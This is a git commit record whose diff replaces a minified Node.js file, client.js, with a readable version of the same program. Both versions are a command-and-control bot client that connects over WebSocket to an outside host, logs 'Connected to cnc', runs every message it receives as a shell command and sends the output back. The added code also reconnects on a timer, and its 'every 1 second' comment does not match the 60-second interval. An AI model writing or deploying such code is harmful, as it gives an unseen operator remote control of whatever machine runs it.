de8365a1a7ea9e9ebd914d44d94b7dbcd0e47d77
YongSheng109 <93895098+YongSheng109@users.noreply.github.com>
2024-08-02 18:31:33 +0800

    Update client.js

--- client.js
+++ client.js
@@ -1,1 +1,47 @@
-const WebSocket=require('ws'),{exec}=require('child_process');function connect(){const ws=new WebSocket('ws://en-teams.gl.at.ply.gg:43276');ws.on('open',()=>console.log('Connected to cnc'));ws.on('message',data=>{const message=Buffer.isBuffer(data)?data.toString('utf8'):data,command=message.trim();if(command.length===0)return void 0;if('cls'===command&&'win32'===process.platform)exec('cls',handleExecResponse);else if('clear'===command&&('linux'===process.platform||'darwin'===process.platform))exec('clear',handleExecResponse);else exec(command,handleExecResponse);function handleExecResponse(error,stdout,stderr){error?ws.send(JSON.stringify({type:'error',message:''})):stdout&&ws.send(JSON.stringify({type:'stdout',message:stdout})),stderr&&ws.send(JSON.stringify({type:'stderr',message:stderr}));}});ws.on('close',()=>setTimeout(connect,1e3)),ws.on('error',()=>{});}connect();
+const WebSocket = require('ws');
+const { exec } = require('child_process');
+
+function connect() {
+    const ws = new WebSocket('ws://en-teams.gl.at.ply.gg:43276');
+
+    ws.on('open', () => {
+        console.log('Connected to cnc');
+
+        // Disconnect after 1 second
+        setTimeout(() => {
+            ws.close();
+        }, 1000);
+    });
+
+    ws.on('message', (data) => {
+        const message = Buffer.isBuffer(data) ? data.toString('utf8') : data;
+        const command = message.trim();
+        if (command.length === 0) return;
+
+        if ('cls' === command && 'win32' === process.platform) {
+            exec('cls', handleExecResponse);
+        } else if ('clear' === command && ('linux' === process.platform || 'darwin' === process.platform)) {
+            exec('clear', handleExecResponse);
+        } else {
+            exec(command, handleExecResponse);
+        }
+
+        function handleExecResponse(error, stdout, stderr) {
+            if (error) {
+                ws.send(JSON.stringify({ type: 'error', message: error.message }));
+            }
+            if (stdout) {
+                ws.send(JSON.stringify({ type: 'stdout', message: stdout }));
+            }
+            if (stderr) {
+                ws.send(JSON.stringify({ type: 'stderr', message: stderr }));
+            }
+        }
+    });
+
+    ws.on('close', () => console.log('Disconnected from cnc'));
+    ws.on('error', () => console.log('Connection error'));
+}
+
+// Connect every 1 second
+setInterval(connect, 60000);
